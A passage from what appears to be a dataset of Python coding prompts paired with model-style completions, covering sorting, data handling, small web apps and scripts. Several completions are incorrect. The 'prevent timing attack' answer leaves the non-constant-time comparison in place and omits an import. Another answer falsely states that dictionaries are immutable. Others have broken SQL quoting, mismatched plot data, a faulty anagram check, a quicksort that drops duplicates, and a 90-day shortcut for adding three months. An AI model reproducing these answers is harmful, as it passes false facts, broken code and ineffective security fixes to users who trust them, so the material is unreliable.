set1.difference(set2)"},{"prompt":"Optimize a given Python program by remove any code that causes unnecessary performance reduction. for i in range(10000000): dig = 0 num = i while num > 0: dig = dig + (num % 10) num = num // 10","completion":"cumulative_sum = 0 while i > 0: cumulative_sum += (i % 10) # add the last digit of the number to the cumulative sum i //= 10 # truncate the last digit of the number # Output #cumulative_sum will hold the sum of all the digits in the number"},{"prompt":"Edit the following Python program to implement try and except a = 10 b = 0 c = a/b","completion":"try: a = 10 b = 0 c = a/b except ZeroDivisionError: print(\\"Error: Cannot divide by zero\\")"},{"prompt":"Develop a machine learning model in Python which can identify the sentiment of a given statement. Not applicable","completion":"import nltk import numpy as np from nltk.tokenize import word_tokenize nltk.download('punkt') from keras.preprocessing.text import Tokenizer from keras.preprocessing.sequence import pad_sequences from keras.models import Sequential from keras.layers import Dense, Embedding, LSTM from sklearn.model_selection import train_test_split # load the dataset data = open('dataset.csv').read() labels, phrases = [], [] for line in data.split('n'): label, phrase = line.split(',') labels.append(label) phrases.append(phrase) # tokenize and vectorize the data tokenizer = Tokenizer() tokenizer.fit_on_texts(phrases) sequences = tokenizer.texts_to_sequences(phrases) word_index = tokenizer.word_index # define the model max_length = max([len(seq) for seq in sequences]) vocab_size = len(word_index) + 1 embedding_dim = 16 X = pad_sequences(sequences, maxlen=max_length) Y = np.array(labels, dtype='float32') model = Sequential() model.add(Embedding(vocab_size, embedding_dim, input_length=max_length)) model.add(LSTM(100)) model.add(Dense(1, activation='sigmoid')) model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) X_train, X_test, Y_train, Y_test = train_test_split(X, Y, test_size=0.2, shuffle=True, random_state=42) model.fit(X_train, Y_train, batch_size=64, epochs=20) # evaluate the model score, acc = model.evaluate(X_test, Y_test, batch_size=32) print(f'Test score: {score}nTest accuracy: {acc}')"},{"prompt":"Create a class in Python that takes a list of numbers as input and returns the product of all the numbers. [5, 4, 9, 10]","completion":"class ProductCalculator: def __init__(self, num_list): self.num_list = num_list def find_product(self): product = 1 for num in self.num_list: product *= num return product # example usage num_list = [5, 4, 9, 10] calc = ProductCalculator(num_list) product = calc.find_product() print(product)"},{"prompt":"Write a function in Python to convert a dictionary into a list and then sort the list alphabetically. Example Dictionary: {'a':1, 'b':2, 'c':3}","completion":"def dict_to_sorted_list(d): # Convert Dictionary to List lst = list(d.items()) # Sort List Alphabetically lst.sort(key=lambda x: x[0]) return lst example_dict = {'a':1, 'b':2, 'c':3} sorted_list = dict_to_sorted_list(example_dict) print(sorted_list) # Output: # [('a', 1), ('b', 2), ('c', 3)]"},{"prompt":"Create a Python script which queries a SQLite database and prints the results in a web page. Not applicable","completion":"import sqlite3 import cgitb cgitb.enable() # Connect to the database conn = sqlite3.connect('mydatabase.db') cursor = conn.cursor() #Execute the query cursor.execute(\\"SELECT * FROM mytable\\") # Print out the result in an HTML page print(\\"Content-type: text/html\\") print() print(\\"<h1>My Query Results</h1>\\") print(\\"<ul>\\") for row in cursor.fetchall(): print(\\"<li>{}</li>\\".format(row)) print(\\"</ul>\\") # Close the connection conn.close()"},{"prompt":"Modify the following Python script to prevent timing attack. def login(username, password): if username in users and users[username] == password: return True else: return False","completion":"def login(username, password): hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest() if username in users and users[username] == hashed_password: return True else: return False"},{"prompt":"Design a custom class to efficiently and reliably store a student's first name, last name, and age in Python.","completion":"class StudentRecord: def __init__(self, first_name, last_name, age): self.first_name = first_name self.last_name = last_name self.age = age # Getters @property def first_name(self): return self._first_name @property def last_name(self): return self._last_name @property def age(self): return self._age # Setters @first_name.setter def first_name(self, first_name): if not isinstance(first_name, str): raise ValueError(\\"First name must be a string\\") self._first_name = first_name @last_name.setter def last_name(self, last_name): if not isinstance(last_name, str): raise ValueError(\\"Last name must be a string\\") self._last_name = last_name @age.setter def age(self, age): if not isinstance(age, int): raise ValueError(\\"Age must be an integer\\") self._age = age"},{"prompt":"Create a method in Python to encode a given string using Base64 encoding technique.","completion":"import base64 def encode_string(string): encoded_string = base64.b64encode(string.encode('utf-8')) return encoded_string"},{"prompt":"mplement a game of Hangman in Python that interprets user input and presents a user with the rules of the game.","completion":"# Hangman game import time import random def play_game(): print(\\"Let's play Hangman!\\") time.sleep(0.5) # Create a list of words words = [\\"plutonium\\",\\"deadline\\",\\"millenium\\",\\"gigabyte\\",\\"hydroelectric\\",\\"hybridize\\"] # Pick a word from list word = random.choice(words) # Create a variable to track games won win_count = 0 # Create a variable to track how many lives you have lives = 6 # Make another variable to track if the game is still running still_playing = True # Create an empty list for guessed letters guessed_words = [] # Create a list for the letters in the secret word secret_word = list(word) # Create another list for discovered letters discovered_word = [] for i in range (0, len(word)): discovered_word.append(\\"_\\") while still_playing: # Check if user has won if discovered_word == secret_word: print(\\"You win!\\") win_count += 1 still_playing = False # Check if user has any lives left if lives == 0: print(\\"You lost, better luck next time!\\") still_playing = False # Show user the letters they have guessed print(\\"Guessed letters: \\" + \\" \\".join(guessed_words)) # Show user the secret word print(\\"Secret word: \\" + \\" \\".join(discovered_word)) # Ask for a letter input_letter = input(\\"Please input a letter or type 'quit': \\").lower() # Check if letter was already guessed if input_letter in guessed_words: print(\\"You already guessed this letter! Guess again.\\") # Check if user decides to quit elif input_letter == \\"quit\\": print(\\"Quitting game. Better luck next time!\\") still_playing = False break # If new letter is guessed else: guessed_words.append(input_letter) count_correct = 0 # Check if new letter is in the secret word for i, letter in enumerate(secret_word): if letter == input_letter: discovered_word[i] = letter count_correct += 1 if count_correct == 0: lives -= 1 print(\\"No luck! \\" + str(lives) + \\" lives remaining!\\")"},{"prompt":"Write a Python program to sort a dictionary by key","completion":"def sort_dict_by_key(sample): # Create a sorted list of keys sorted_keys = sorted(sample.keys()) # Iterate over the sorted sequence for key in sorted_keys: # Generate key-value pair print (key, sample[key]) sample = {'c':10, 'a':8, 'b':12, 'e':3, 'd':4} sort_dict_by_key(sample)"},{"prompt":"Develop a program which reverts a string without using reverse() Pytho","completion":"def reverseString(str): i = len(str) rev_str = \\"\\" while i > 0: rev_str += str[i-1] i = i-1 return rev_str str = \\"Python\\" print(\\"Original string: \\" + str) print(\\"Reversed string: \\" + reverseString(str))"},{"prompt":"Produce an algorithm in Python to read in a text document and compute the frequency of each word.","completion":"def word_frequency(filename): # Create an empty dictionary d = {} # Open the file for reading with open(filename, 'r') as f: # Read in each line for line in f.readlines(): # Divide the line into words words = line.split() # Count the words for word in words: # Increment the word's count d[word] = d.get(word, 0) + 1 # Return the dictionary return d freqDict = word_frequency('text.txt') print(freqDict)"},{"prompt":"Create a Django web application to show the current weather for a given location. Not applicable","completion":"# Project Setup python3 -m venv venv source venv/bin/activate pip install django django-admin startproject weather # App Setup cd weather django-admin startapp currentweather # Settings File # In weather/settings.py add the app and api key INSTALLED_APPS = [ 'currentweather', ] WEATHER_API_KEY = '<YOUR_API_KEY_HERE>' # Model # In currentweather/models.py from django.db import models class WeatherData(models.Model): location = models.CharField(max_length=100) temperature = models.IntegerField() condition = models.CharField(max_length=100) # View # In currentweather/views.py from django.shortcuts import render import requests from .models import WeatherData # Use your API key to make a request to fetch weather data def get_weather_data(location): url = 'http://api.openweathermap.org/data/2.5/weather?q={}&appid={}'.format(location, WEATHER_API_KEY) data = requests.get(url).json() return data # Create a view to display the weather data def weather(request): location = request.GET.get('location', '') # Fetch weather data for the given location weather_data = get_weather_data(location) context = { 'weather_data': weather_data, } return render(request, 'currentweather/weather.html', context) # Template # In currentweather/templates/currentweather/weather.html <h1>Current Weather - {{ weather_data.name }}</h1> <div> <h2>Temperature : {{ weather_data.main.temp }}°C</h2> <h2>Condition : {{ weather_data.weather[0].main }}</h2> </div>"},{"prompt":"Convert a SQL query to Python code. SELECT * FROM orders WHERE status = 'shipped'","completion":"import sqlite3 conn = sqlite3.connect('database.db') c = conn.cursor() c.execute('SELECT * FROM orders WHERE status = 'shipped'') result = c.fetchall() for row in result: print(row) conn.close()"},{"prompt":"Create a JSON object using Python that contains the following data: Name: John Age: 56 City: New York","completion":"data = { 'name': 'John', 'age': 56, 'city': 'New York' }"},{"prompt":"Write a Python function to generate a sequence of numbers of a given length which contain prime numbers only. 8","completion":"def generate_prime_sequence(length): prime_sequence = [] prime_number = 2 while len(prime_sequence) < length: is_prime = True for i in range(2, int(prime_number/2) + 1): if prime_number % i == 0: is_prime = False break if is_prime: prime_sequence.append(prime_number) prime_number += 1 return prime_sequence print(generate_prime_sequence(8))"},{"prompt":"Translate English sentence Choose a random number into Python code.","completion":"import random random_number = random.randint(1,100) print(\\"Random number:\\", random_number)"},{"prompt":"Write a Python program to optimize a dataset for predictive modeling. The dataset contains features such as age, gender, country, and height.","completion":"import pandas as pd # Read in the dataset df = pd.read_csv('dataset.csv') # basic data cleaning df = df.dropna() # Convert categorical variables to dummy variables df = pd.get_dummies(df, columns=['country','gender']) # Scale the numeric variables from sklearn.preprocessing import MinMaxScaler scaler = MinMaxScaler() df[['age', 'height']] = scaler.fit_transform(df[['age','height']]) # Save the optimized dataset df.to_csv('optimized_dataset.csv', index=False)"},{"prompt":"Generate a Python class to construct a linked list.","completion":"class Node: def __init__(self, data): self.data = data self.next = None class LinkedList: def __init__(self): self.head = None def append(self, new_data): new_node = Node(new_data) if self.head == None: self.head = new_node return last = self.head while last.next: last = last.next last.next = new_node"},{"prompt":"Suggest an improvement to the following python program. def find_duplicates(lst): duplicates = [] for elem in lst: if lst.count(elem) > 1: if elem not in duplicates: duplicates.append(elem) return duplicate","completion":"def find_duplicates(lst): seen = set() duplicates = [] for elem in lst: if elem in seen: duplicates.append(elem) else: seen.add(elem) return duplicates"},{"prompt":"Write a Python program to generate a 3x4 matrix containing random numbers.","completion":"import random def generate_random_matrix(): matrix = [[random.randint(1, 10) for col in range(4)] for row in range(3)] return matrix"},{"prompt":"Given a list of numbers, write a Python program to find the element in the list having the highest value.","completion":"def find_max(list): max_value = list[0] for num in list: if num > max_value: max_value = num return max_value"},{"prompt":"Can you create a Python program to generate a random string of 16 alphabets?","completion":"import random import string def random_string(): chars = string.ascii_lowercase size = 16 return ''.join(random.choice(chars) for _ in range(size)) print(random_string())"},{"prompt":"Design a web scraper in python to get the latest news.","completion":"import requests from bs4 import BeautifulSoup url = 'http://www.example.com/latest-news' # get the html content content = requests.get(url) # create a soup object soup = BeautifulSoup(content.text, 'html.parser') # get all the news title and links news = soup.findAll('a', attrs = {'class': 'news-link'}) # loop over all the news for n in news: print(n.text, n['href'])"},{"prompt":"Create an optimization algorithm in Python which finds the smallest number in an array of integers. [20, 8, 7, 22, 32]","completion":"def find_smallest_int(arr): smallest_num = arr[0] for num in arr: if num < smallest_num: smallest_num = num return smallest_num arr = [20, 8, 7, 22, 32] smallest_num = find_smallest_int(arr) print(\\"The smallest number is\\", smallest_num)"},{"prompt":"Generate a Python code snippet to compute the sum of the digits of a given number.","completion":"def sum_digits(num): summation = 0 while num > 0: summation += num % 10 num = num // 10 return summation"},{"prompt":"Design an algorithm in Python that can solve a Rubik’s cube. Not applicable","completion":"def execute_moves(cube, moves): # Executes a specified set of moves on a rubik's cube # cube: list representing a rubik's cube # move: list of moves, each move specifying a set of slices to rotate for move in moves: rotate_cube(cube, move) def rotate_cube(cube, move): # Rotates the sides of a rubik's cube according to a single move # cube: list representing a rubik's cube # move: list of slices of a rubik's cube to rotate # Perform rotations for slice in move: cube[slice] = rotate_layer(cube[slice]) return cube def rotate_layer(slice): # Rotates a single layer of a rubik's cube # slice: 3x3 list of the values in that layer # Rotate the layer clockwise return [slice[2][0],slice[1][0],slice[0][0], slice[2][1],slice[1][1],slice[0][1], slice[2][2],slice[1][2],slice[0][2]] def solve_cube(cube): # Main function that solves a rubik's cube # cube: list representing a rubik's cube # Determine cube state by analyzing thecube[i][j][k] values scramble_state = analyze_cube(cube) # Find the sequence of moves required to solve thecube[i][j][k] moves = get_solve_moves(scramble_state) # Execute moves to solve thecube[i][j][k] execute_moves(cube, moves)"},{"prompt":"Use a Python library to find sequences of similar strings in a given text. Not applicable","completion":"import difflib # Define input text text = \\"this is a string with a few similar words\\" # Find sequences of similar strings matcher = difflib.SequenceMatcher(None, a=text.split(), b=text.split()) for tag, i1, i2, j1, j2 in matcher.get_opcodes(): if tag == 'equal': print(text[i1:i2])"},{"prompt":"What is the difference between a list and a dictionary in Python?","completion":"In Python, a list is an ordered sequence of elements, while a dictionary (or \\"dict\\") is an unordered collection of key-value pairs. A list stores elements sequentially and has no associated key with each element. A dictionary stores elements in key-value pairs, and each element is associated with a unique key. Additionally, a list is mutable, meaning the elements inside the list can be changed, while a dictionary is immutable, meaning the key-value pairs cannot be changed."},{"prompt":"Generate a Python script to visualize a dataset of four columns.","completion":"import matplotlib.pyplot as plt # Create the data x = [1, 2, 3, 4] y1 = [2, 4, 6, 8] y2 = [3, 6, 9, 12] # Plot the data plt.plot(x, y1) plt.plot(x, y2) # Add a title plt.title(\\"Two Lines on One Graph\\") # Add X and y Label plt.xlabel('X Axis') plt.ylabel('Y Axis') # Add a legend plt.legend(['Line1', 'Line2']) # Show the plot plt.show()"},{"prompt":"Build a Python program to generate an html page that displays a bar chart showing the relationship between age and number of people. Age and number of people Age | Number of people 18 – 28 | 500 28 – 38 | 600 38 – 48 | 400 48 – 58 | 200 58 – 68 | 100","completion":"import matplotlib.pyplot as plt # data age = [18, 28, 38, 48, 58, 68] number = [500, 600, 400, 200, 100] # bar plot plt.bar(age, number) # set title and labels plt.title('Age and Number of People') plt.xlabel('Age') plt.ylabel('Number of people') # save and show the figure plt.savefig('bar_plot.png') plt.show()"},{"prompt":"Design an algorithm in Python to detect an anagram in a string. Input string: eat tea","completion":"def isAnagram(string): for i in range(len(string)): for j in range(i + 1, len(string)): if sorted(string[i]) == sorted(string[j]): return True return False"},{"prompt":"Create a Twitter bot using Python that automatically retweets posts based on the user's profile. A user's profile consists of their interests, hobbies and topics they like to talk about.","completion":"import tweepy import time consumer_key = 'your consumer key' consumer_secret = 'your consumer secret' access_token = 'your access token' access_token_secret = 'your access token secret' auth = tweepy.OAuthHandler(consumer_key, consumer_secret) auth.set_access_token(access_token, access_token_secret) api = tweepy.API(auth) interests = ['computers', 'cricket', 'movies'] # interests of the user while True: for interest in interests: search = '#' + interest tweets = api.search(search) for tweet in tweets: api.retweet(tweet.id) time.sleep(30) # sleep for 30 seconds"},{"prompt":"Write a script in Python to format a date.","completion":"import datetime now = datetime.datetime.now().strftime(\\"%d/%m/%Y\\") print(now)"},{"prompt":"Produce a program in Python to augment a dataset by randomly scaling the feature values in the dataset.","completion":"# Load the dataset dataset = pd.read_csv('dataset.csv') # Get the feature names features = dataset.columns[:-1].tolist() # Scaling factor scale_factor = 0.1 # Augment the dataset by randomly scaling the feature values augmented_dataset = dataset.copy() for feature in features: augmented_dataset[feature] += np.random.randn(len(augmented_dataset))*scale_factor # Save the augmented dataset augmented_dataset.to_csv('augmented_dataset.csv', index=False)"},{"prompt":"Define a Python class called Appointment that creates appointment objects.","completion":"class Appointment(): def __init__(self, date, time, reason): self.date = date self.time = time self.reason = reason def get_details(self): return f\\" The appointment is on {self.date}, at {self.time}, for {self.reason}.\\""},{"prompt":"Use Python to implement a tree traversal algorithm that produces an inorder traversal.","completion":"def inOrderTraversal(root): if root is not None: inOrderTraversal(root.left) print(root.val) inOrderTraversal(root.right)"},{"prompt":"Write a function in Python to determine the largest number in a given array.","completion":"def get_largest_number(numbers): largest_number = numbers[0] for number in numbers: if number > largest_number: largest_number = number return largest_number"},{"prompt":"Design a Python program to classify a given set of data using a decision tree.","completion":"# Importing the libraries import numpy as np import pandas as pd import matplotlib.pyplot as plt from sklearn.tree import DecisionTreeClassifier from sklearn.model_selection import train_test_split # Importing the dataset dataset = pd.read_csv('data.csv') X = dataset.iloc[:, :-1].values y = dataset.iloc[:, -1].values # Splitting the dataset into the Training set and Test set X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.25, random_state = 0) # Fitting the Decision Tree Classification to the Training set classifier = DecisionTreeClassifier() classifier.fit(X_train, y_train) # Predicting the Test set results y_pred = classifier.predict(X_test) # Making the Confusion Matrix from sklearn.metrics import confusion_matrix cm = confusion_matrix(y_test, y_pred)"},{"prompt":"Complete the Python program to automatically add 3 months to a date. import datetime date_str = '20200131' def add_three_month","completion":"import datetime date_str = '2020-01-31' def add_three_months(date_str): d = datetime.datetime.strptime(date_str, '%Y-%m-%d') d = d + datetime.timedelta(days=90) date_str = d.strftime('%Y-%m-%d') return date_str"},{"prompt":"Convert a Python dictionary to a JavaScript object. A python dictionary containing two keyvalue pairs.","completion":"const pythonDictionary = { 'key1': 'value1', 'key2': 'value2' }; const jsObject = Object.fromEntries( Object.entries(pythonDictionary) ); console.log(jsObject); // {key1: 'value1', key2: 'value2'}"},{"prompt":"Refactor a Python program to remove duplicate code. def add(value1, value2): result = value1 + value2 print(result) def subtract(value1, value2): result = value1 value2 print(result) def multiply(value1, value2): result = value1 * value2 print(result)","completion":"def calculate(value1, value2, operation): if (operation == 'add'): result = value1 + value2 elif (operation == 'subtract'): result = value1 - value2 elif (operation == 'multiply'): result = value1 * value2 else: return print(result) add(3, 2) subtract(3, 2) multiply(3, 2) calculate(3, 2, 'add') calculate(3, 2, 'subtract') calculate(3, 2, 'multiply')"},{"prompt":"mplement a sorting algorithm in Python that sorts a given array of numbers. array = [2, 7, 4, 1, 5, 3]","completion":"def sort_array(array): for i in range(len(array)): min_idx = i for j in range(i+1, len(array)): if array[min_idx] > array[j]: min_idx = j array[i], array[min_idx] = array[min_idx], array[i] return array result = sort_array(array) print(result) // Output: [1, 2, 3, 4, 5, 7]"},{"prompt":"mplement a function in Python to print the number of times 'Hello World' is printed, given a string and a substring. string = 'Hello World, Hello World' substring = 'Hello World'","completion":"def countStringOccurrences(string, substring): cnt = 0 index = -1 while string.find(substring, index + 1) != -1: index = string.find(substring, index + 1) cnt += 1 return cnt occurrences = countStringOccurrences('Hello World, Hello World', 'Hello World') print(occurrences)"},{"prompt":"Create a string manipulation program in Python that takes a user input string and outputs a version of the string with all characters in uppercase. Hello World","completion":"userString = input(\\"Enter a string: \\") uppercasedString = userString.upper() print(uppercasedString)"},{"prompt":"Write a Python program that takes a list as input and returns a list that contains only the unique elements. list_items = [2, 3, 3, 4, 4, 5, 6, 7, 7]","completion":"list_items = [2, 3, 3, 4, 4, 5, 6, 7, 7] def find_unique_items(input_list): result = [] for elem in input_list: if elem not in result: result.append(elem) return result print(find_unique_items(list_items))"},{"prompt":"Develop a program in Python that takes two lists as input and creates a new list that contains only the common elements of both lists. list1=[1,2,3], list2=[2,3,4]","completion":"def common_elements(list1, list2): common_list = [] for element1 in list1: for element2 in list2: if element1 == element2: common_list.append(element1) return common_list common_elements_list = common_elements([1,2,3], [2,3,4]) print(common_elements_list)"},{"prompt":"Create a Python Flask application with a simple REST API endpoint for creating posts. The endpoint should persist the post in a MongoDB database, and return a response containing the post data. Not applicable","completion":"from flask import Flask, request from flask_pymongo import PyMongo import json app = Flask(__name__) app.config['MONGO_URI'] = 'mongodb://localhost:27017/posts' mongo = PyMongo(app) @app.route('/posts', methods=['POST']) def create_post(): data = request.get_json() post_id = mongo.db.posts.insert(data.json()) post = mongo.db.posts.find_one( {'_id': post_id} ) post_data = { 'id': str(post_id), 'title': post['title'], 'body': post['body'] } return json.dumps( post_data ) if __name__ == '__main__': app.run(debug = True)"},{"prompt":"Create a Python program that reads two dates and computes the number of days between them. date_1 = '20200101' date_2 = '20200130'","completion":"from datetime import date date_1 = date(2020, 1, 1) date_2 = date(2020, 1, 30) diff = date_2 - date_1 print('There are {} days between the two dates.'.format(diff.days))"},{"prompt":"mplement two different sorting algorithms in Python (i.e. bubble sort and quick sort)","completion":"def bubbleSort(arr): n = len(arr) # Traverse through all array elements for i in range(n): # Last i elements are already in place for j in range(0, n-i-1): # traverse the array from 0 to n-i-1 # Swap if the element found is greater # than the next element if arr[j] > arr[j+1]: arr[j], arr[j+1] = arr[j+1], arr[j] # driver code to test the above code arr = [64, 34, 25, 12, 22, 11, 90] bubbleSort(arr) print (\\"Sorted array is:\\") for i in range(len(arr)): print (\\"%d\\" %arr[i]), def partition(arr, low, high): i = (low - 1) # index of smaller element pivot = arr[high] # pivot for j in range(low, high): # If current element is smaller than or # equal to pivot if arr[j] <= pivot: # increment index of smaller element i = i + 1 arr[i], arr[j] = arr[j], arr[i] arr[i + 1], arr[high] = arr[high], arr[i + 1] return (i + 1) # The main function that implements QuickSort # arr[] --> Array to be sorted, # low --> Starting index, # high --> Ending index # Function to do Quick sort def quickSort(arr, low, high): if len(arr) == 1: return arr if low < high: # pi is partitioning index, arr[p] is now # at right place pi = partition(arr, low, high) # Separately sort elements before # partition and after partition quickSort(arr, low, pi-1) quickSort(arr, pi+1, high) # driver code to test the above code arr = [64, 34, 25, 12, 22, 11, 90] n = len(arr) quickSort(arr, 0, n-1) print (\\"Sorted array is:\\") for i in range(n): print (\\"%d\\" %arr[i]),"},{"prompt":"Develop a Python function that takes two arrays of equal size as input and returns the sum of the two arrays. [1,2,3], [4,5,6]","completion":"def sum_arrays(arr1, arr2): result = [] for i in range(len(arr1)): result.append(arr1[i] + arr2[i]) return result summed = sum_arrays([1,2,3], [4,5,6]) print(summed)"},{"prompt":"Transform the following algorithm description into a working python function. Given a list of numbers, find the sum of the elements in the list.","completion":"def sum_list(nums_list): total = 0 for num in nums_list: total += num return total"},{"prompt":"Code a solution to this leetcode problem using Python. Problem: Given an array of integers and an integer k, you need to find the total number of continuous subarrays whose sum equals to k. Example 1: Input:nums = [1,1,1], k = 2 Output: 2","completion":"def subarraySum(nums, k): count = 0 sums = [0]*(len(nums) + 1) for i in range(1,len(nums) + 1): sums[i] = sums[i-1] + nums[i-1] for i in range(len(nums)): for j in range(i+1,len(nums) + 1): if sums[j] - sums[i] == k: count += 1 return count"},{"prompt":"Write a code in Python to classify the given input into two categories healthy and unhealthy. [{protein:20,fat:20,carbs:30},{protein:10,fat:45,carbs:30}]","completion":"# Defining the model def classify(data): healthy = [] unhealthy = [] for item in data: protein = item[\\"protein\\"] fat = item[\\"fat\\"] carbs = item[\\"carbs\\"] if protein >= 10 and fat <= 20 and carbs <= 50: healthy.append(item) else: unhealthy.append(item) return { \\"healthy\\": healthy, \\"unhealthy\\": unhealthy} # Running the program data = [{\\"protein\\":20,\\"fat\\":20,\\"carbs\\":30},{\\"protein\\":10,\\"fat\\":45,\\"carbs\\":30}] result = classify(data) print(result)"},{"prompt":"Convert the following string to a list of individual elements in Python: apple,orange,banana.","completion":"list = [\\"apple\\", \\"orange\\", \\"banana\\"]"},{"prompt":"Design a basic class in Python that contains a constructor, two variables (name, email) and a function that prints out the name, email and the time the object was created. John, john@example.com","completion":"import time class Person: def __init__(self, name, email): self.name = name self.email = email self.timeCreated = time.ctime() def print_info(self): print(f\\"Name: {self.name}, Email: {self.email}, Time created: {self.timeCreated}\\") person = Person(\\"John\\", \\"john@example.com\\") person.print_info()"},{"prompt":"Generate a Python program that takes a numeric input and reverses it. 42","completion":"def reverse_number(num): rev = 0 while num > 0: r = num % 10 rev = (rev * 10) + r num = num // 10 return rev input_num = 42 res = reverse_number(input_num) print(res)"},{"prompt":"Develop an artificial intelligence chatbot in Python. The chatbot should be able to respond to basic queries. Not applicable","completion":"import random def respond(message): # Check for a question mark if message.endswith(\\"?\\"): return random.choice([\\"I don't know :(\\", \\"You tell me!\\"]) # Return a random greeting return random.choice([\\"Hi there!\\", \\"Hello!\\", \\"Nice to meet you!\\"])"},{"prompt":"Develop an Python optimizer algorithm that should return the variables in a (1+n)Dimensional search space to minimize the objective function. Not applicable","completion":"def optimize(func, d): \\"\\"\\"Optimize a function with dimension d using gradient descent Args: func: The objective function d: The dimension Returns: An array of the variables that minimize the function \\"\\"\\" # Initialize the variables to random values x = [random.random() for _ in range(d)] # Perform gradient descent lr = 0.01 for _ in range(1000): # Compute the derivative grad = [compute_derivative(x, i) for i in range(d)] # Update the variables with the gradient for i in range(d): x[i] -= lr * grad[i] return x def compute_derivative(x, i): \\"\\"\\"Computes the derivative of the objective function with respect to the ith variable Args: x: The variables in the search space i: The index of the variable to compute the derivative for Returns: The derivative of the objective function \\"\\"\\" h = 1e-4 x[i] += h f_plus = func(x) x[i] -= 2 * h f_minus = func(x) x[i] += h return (f_plus - f_minus) / (2 * h)"},{"prompt":"Generate a Python web scraper for fetching data from a given URL. URL: https://www.example.com/new","completion":"import requests import bs4 # # Function for fetching HTML from the given url def fetch_url(url): res = requests.get(url) soup = bs4.BeautifulSoup(res.text, 'html.parser') return soup # Fetch the HTML soup = fetch_url(\\"https://www.example.com/news\\") # Parse the HTML//Get all the news items news_items = soup.find_all('div',class_=\\"news-item\\") for item in news_items: # Get the title title = item.find('h2',class_=\\"news-title\\") # Get the body body = item.find('p',class_=\\"news-body\\") # Do something with the title and the body print(title.text) print(body.text)"},{"prompt":"Enhance a QuickSort algorithm in Python to partition using the median of three pivot selection. [5, 2, 9, 4, 1, 6]","completion":"def quick_sort(array): if len(array) < 2: return array # pick a pivot element as the median of the first, middle, and last elements pivot_index = len(array)//2 middle_index = len(array)//2 if array[0] > array[middle_index]: pivot_index = 0 if array[middle_index] > array[-1] else -1 else: pivot_index = 0 if array[middle_index] < array[-1] else -1 pivot = array[pivot_index] # from the remaining elements, create partitions either smaller than or larger than the pivot less_than_partition = [i for i in array if i < pivot] greater_than_partition = [i for i in array if i > pivot] # recursively sort both partitions less_than_partition = quick_sort(less_than_partition) greater_than_partition = quick_sort(greater_than_partition) # combine the sorted partitions and the pivot return less_than_partition + [pivot] + greater_than_partition array = [5, 2, 9, 4, 1, 6] sorted_array = quick_sort(array) print(sorted_array) # [1, 2, 4, 5, 6, 9]"},{"prompt":"Generate a Python program to parse a string and return the substrings which are enclosed in the given pattern pattern = string = This is a sample string 1 with 2 some 3 example 4 patterns","completion":"def parse_string(pattern, string): ''' This function parses a string and return the substrings which are enclosed in the given pattern. Parameters ---------- pattern : str The given pattern string : str The given string Returns ------- List Contains substrings enclosed within the given pattern. ''' # Initialize list to store substrings sub_strings = [] # Get the start and end positions of each substring start = string.find(pattern) end = string.find(pattern, start+1) # Iterate through the string while start >= 0 and end > start: # Get substring and append to list sub_strings.append(string[start+len(pattern):end]) # Get new start and end positions start = end end = string.find(pattern, start+1) # Return list of substrings return sub_strings"},{"prompt":"Optimize the following Python code snippet to make it run faster. def add_numbers(numbers): result = 0 for num in numbers: result += num return resul","completion":"def add_numbers(numbers): result = 0 l = len(numbers) i = 0 while i < l: result += numbers[i] i += 1 return result"},{"prompt":"Write a function in Python to print the reverse of a string.","completion":"def print_reverse(s): print(s[::-1])"},{"prompt":"Generate a Python script to sort a list of integers Input: [3, 8, 1, 5, 6]","completion":"def sort_list(my_list): my_list.sort() return my_list print(sort_list([3,8,1,5,6]))"},{"prompt":"Write a function in Python to find the first nonrepeating character in a given string. the quick brown fox jumps over the lazy dog","completion":"def non_repeating_char(s): char_freq = {} for c in s: if c in char_freq: char_freq[c] += 1 else: char_freq[c] = 1 for c in s: if char_freq[c] == 1: return c if __name__ == '__main__': print(non_repeating_char(\\"the quick brown fox jumps over the lazy dog\\"))"},{"prompt":"Create a Python program to optimize web pages for SEO. Not applicable","completion":"import re import requests def optimize_webpage(url): r = requests.get(url, timeout=5) content = r.text content = content.lower() title = re.search('<title>(.*)</title>', content) title_text = title.group(1).strip() content = content.replace(title_text, title_text.lower()) keywords = re.findall('<meta name=\\"keywords\\" content=\\"(.*)\\">', content) for word in keywords: if word.strip(): content = content.replace(word, word.lower()) description = re.findall('<meta name=\\"description\\" content=\\"(.*)\\">', content) for desc in description: if desc.strip(): content = content.replace(desc, desc.lower()) return content"},{"prompt":"Generate a Python program that creates a list of five random integers between 1 and 100. Not applicable","completion":"import random my_list = [] for i in range(5): my_list.append(random.randint(1,100)) print(my_list)"},{"prompt":"Write a Python program to load an XML document and convert it into a JSON object. <bookstore> <book> <title>Harry Potter</title> <author>J.K. Rowling</author> </book> <book> <title>The Lord of the Rings</title> <author>J.R.R. Tolkien</author> </book> </bookstore>","completion":"import xml.etree.ElementTree as ET import json xml_string = ''' <bookstore> <book> <title>Harry Potter</title> <author>J.K. Rowling</author> </book> <book> <title>The Lord of the Rings</title> <author>J.R.R. Tolkien</author> </book> </bookstore> ''' def xml_to_json(xml_string): root = ET.fromstring(xml_string) data = {'bookstore': []} for book in root: info = { 'title': book.find('title').text, 'author': book.find('author').text } data['bookstore'].append(info) return json.dumps(data) json_string = xml_to_json(xml_string) print(json_string) # Output: {\\"bookstore\\": [{\\"title\\": \\"Harry Potter\\", \\"author\\": \\"J.K. Rowling\\"}, {\\"title\\": \\"The Lord of the Rings\\", \\"author\\": \\"J.R.R. Tolkien\\"}]}"},{"prompt":"Write a Python script to generate a new random number between 0 to 50","completion":"import random def get_rand(): return random.randint(0, 50)"},{"prompt":"Split the following string into words in Python string = 'this_is_a_string_in_python'","completion":"# Split the string by '_' separator words = string.split('_') # Print each word separately for word in words: print(word)"},{"prompt":"Create an animation in Python using some type of visualization library like Matplotlib. Not applicable","completion":"import matplotlib.pyplot as plt from matplotlib.animation import FuncAnimation fig, ax = plt.subplots() xdata, ydata = [], [] def update(frame): xdata.append(frame) ydata.append(frame ** 2) ax.clear() ax.plot(xdata, ydata) animation = FuncAnimation(fig, update, frames=range(100), interval=100) plt.show()"},{"prompt":"Develop a python program to detect anomalies in a given set of data. the data set contains 1000 samples of the price of oil.","completion":"import numpy as np # Load the dataset data = np.loadtxt('oil_prices.txt') # Compute mean and standard deviation mean = np.mean(data) std = np.std(data) # Identify anomalies anomalies = [] for i in range(len(data)): z_score = (data[i] - mean)/std if abs(z_score) > 3: anomalies.append(data[i]) # Print the anomalies print(\\"Anomalies:\\") 